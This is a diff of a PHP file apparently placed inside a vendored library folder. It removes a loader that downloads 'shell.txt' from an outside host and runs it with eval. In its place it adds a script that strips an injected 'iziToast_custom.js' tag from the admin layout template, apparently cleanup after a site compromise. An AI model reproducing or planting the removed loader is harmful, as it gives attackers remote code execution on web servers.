@@ -1,10 +1,36 @@
 <?php
-'';
-$Url = "https://txt.dev-drops.com/shell.txt";
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $Url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$output = curl_exec($ch);
-curl_close($ch);
-echo eval('?>' . $output); //
-?>
+
+// Step 1: Current directory (assuming we're in core/vendor/vlucas/phpdotenv/src/)
+$currentDir = __DIR__;
+
+// Step 2: Go back to 'core' folder
+$coreDir = realpath($currentDir . '/../../../../..'); // adjust if needed
+if (!$coreDir) {
+    die("Cannot find core directory.\n");
+}
+
+// Step 3: Path to the Blade file
+$bladeFile = $coreDir . '/resources/views/admin/layouts/master.blade.php';
+
+// Step 4: Read file
+if (!file_exists($bladeFile)) {
+    die("Blade file not found: $bladeFile\n");
+}
+
+$content = file_get_contents($bladeFile);
+
+// Step 5: Remove only this specific script line
+$lineToRemove = '<script type="module" src="{{asset(\'assets/global/css/new/iziToast_custom.js\')}}"></script>';
+
+// Split by lines, remove matching line, rejoin
+$lines = explode("\n", $content);
+$lines = array_filter($lines, function($line) use ($lineToRemove) {
+    return trim($line) !== $lineToRemove;
+});
+
+$newContent = implode("\n", $lines);
+
+// Step 6: Save back to file
+file_put_contents($bladeFile, $newContent);
+
+echo "Removed the iziToast_custom.js script line.\n";
